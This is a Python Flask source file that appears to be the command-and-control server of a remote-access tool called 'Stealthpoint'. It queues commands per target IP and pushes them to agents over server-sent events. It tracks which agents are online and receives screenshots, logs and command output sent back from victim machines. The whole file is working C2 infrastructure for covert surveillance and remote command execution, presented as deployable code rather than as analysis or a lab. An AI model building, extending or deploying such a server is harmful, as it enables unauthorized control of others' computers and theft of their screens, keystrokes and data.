from gevent import monkey
monkey.patch_all()
import time
import os
import base64
from flask import Flask, json, request, jsonify, Response
from pymongo import MongoClient

app = Flask(__name__)

class MongoHelper:
    _db = None

    @classmethod
    def get_db(cls):
        if cls._db is None:
            try:
                uri = os.environ.get("MONGO_URI")
                # connect=False is the critical fix for gevent/gunicorn
                client = MongoClient(uri, connect=False, maxPoolSize=10)
                cls._db = client['Stealthpoint_DB']
                print("MongoDB connection initialized via Lazy Load")
            except Exception as e:
                print(f"Error connecting to MongoDB: {e}")
                return None
        return cls._db

active_agents = {}
# --- ROUTES ---

@app.route("/")
def home():
    return jsonify({"status": "running"}), 200

@app.route('/api/<ip>/<username>', methods=['GET'])
def check_command(ip, username):
    db = MongoHelper.get_db()
    print(f"Checking for commands for IP: {ip.strip()}")

    active_agents[ip.strip()] = {
            "username": username,
            "last_seen": time.strftime("%H:%M:%S"),
            "status": "Online"
        }
    print(f"[*] Agent Joined: {username} ({ip})")
    def check_db_for_command():
        last_check = time.time()
        try:
            while True:
                try:
                    # Use the localized db instance
                    command = db.commands.find_one_and_delete({"target_ip": ip.strip()})
                    
                    if command:
                        data = {
                            "command": command['command'],
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        yield f"data: {json.dumps(data)}\n\n"
                        last_check = time.time()
                    
                    # Heartbeat for Render (15s interval)
                    current_time = time.time()
                    if current_time - last_check >= 15:
                        yield f": heartbeat\n\n"
                        last_check = current_time
                    
                    time.sleep(2) 
                    
                except Exception as e:
                    print(f"SSE Error: {e}")
                    time.sleep(5)
        finally:
            # Update last_seen for the agent
            if ip.strip() in active_agents:
                del active_agents[ip.strip()]
                print(f"[-] Agent Offline: {username} ({ip})")

    return Response (
        check_db_for_command(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
            "Content-Type": "text/event-stream"
        }
    )

@app.route('/api/<ip>/screenshot', methods=['POST'])
def receive_screenshot(ip):
    db = MongoHelper.get_db()
    json_data = request.get_json()
    img_bytes = base64.b64decode(json_data["image"])
    
    db.screenshots.insert_one({
        "username": json_data.get("username"),
        "target_ip": ip.strip(),
        "screenshot": img_bytes, 
        "timestamp": json_data.get("timestamp")
    })
    return jsonify({"status": "success"}), 200

@app.route('/api/<ip>/logs', methods=['POST'])
def receive_logs(ip):
    db = MongoHelper.get_db()
    logs_json_data = request.get_json()
    
    db.logs.insert_one(logs_json_data)
    return jsonify({"status": "success"}), 200

@app.route('/api/<ip>/output', methods=['POST'])
def receive_output(ip):
    db = MongoHelper.get_db()
    output_json_data = request.get_json()
    
    db.output.insert_one(output_json_data)
    return jsonify({"status": "success"}), 200

@app.route('/live')
def view_live_agents():
    return jsonify(active_agents)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
